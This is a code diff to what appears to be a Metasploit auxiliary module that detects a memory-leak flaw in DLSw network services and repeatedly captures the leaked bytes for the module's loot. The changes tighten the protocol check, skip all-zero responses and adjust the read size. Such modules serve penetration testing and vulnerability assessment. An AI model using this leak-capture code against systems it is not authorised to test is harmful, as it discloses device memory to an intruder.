@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
     "#{rhost}:#{rport}"
   end
 
-  def get_response(size = 8)
+  def get_response(size = 72)
     connect
     response = sock.get_once(size)
     disconnect
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
     if response.blank?
       vprint_status("#{peer}: no response")
       Exploit::CheckCode::Safe
-    elsif response[0..3] == "\x31\x48\x01\x5b"
+    elsif response[0..1] == "\x31\x48" || response[0..1] == "\x32\x48"
       vprint_good("#{peer}: Detected DLSw protocol")
       report_service(
         host: rhost,
@@ -71,15 +71,17 @@ class Metasploit3 < Msf::Auxiliary
       )
       # TODO: check that response has something that truly indicates it is vulnerable
       # and not simply that it responded
-      print_good("#{peer}: leaked #{response.length} bytes")
-      report_vuln(
-        host: rhost,
-        port: rport,
-        name: name,
-        refs: references,
-        info: "Module #{fullname} collected #{response.length} bytes"
-      )
-      Exploit::CheckCode::Vulnerable
+      unless response[18..72].scan(/\x00/).length == 54
+        print_good("#{peer}: leaked #{response.length} bytes")
+        report_vuln(
+          host: rhost,
+          port: rport,
+          name: name,
+          refs: references,
+          info: "Module #{fullname} collected #{response.length} bytes"
+        )
+        Exploit::CheckCode::Vulnerable
+      end
     else
       vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
       Exploit::CheckCode::Safe
@@ -92,7 +94,7 @@ class Metasploit3 < Msf::Auxiliary
 
     dlsw_data = ''
     until dlsw_data.length > datastore['LEAK_AMOUNT']
-      response = get_response(72)
+      response = get_response
       dlsw_data << response[18..72] unless response.blank?
     end
     loot_and_report(dlsw_data)
